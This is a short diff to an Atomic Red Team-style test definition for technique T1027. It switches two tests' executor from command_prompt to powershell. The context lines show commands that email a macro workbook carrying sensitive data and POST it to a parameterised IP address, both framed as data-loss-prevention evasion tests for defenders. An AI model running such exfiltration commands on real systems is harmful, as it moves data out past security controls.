@@ -128,7 +128,7 @@ atomic_tests:
   executor:
     command: |
       "Send-MailMessage -From #{sender} -To #{receiver} -Subject "T1027 Atomic Test" -Attachments PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm -SmtpServer #{smtp_server}"
-    name: command_prompt
+    name: powershell
 
 - name: DLP Evasion via Sensitive Data in VBA Macro over HTTP
   description: |
@@ -149,4 +149,4 @@ atomic_tests:
   executor:
     command: |
       Invoke-WebRequest -Uri #{ip_address} -Method POST -Body PathToAtomicsFolder\T1027\src\T1027-cc-macro.xlsm
-    name: command_prompt
+    name: powershell
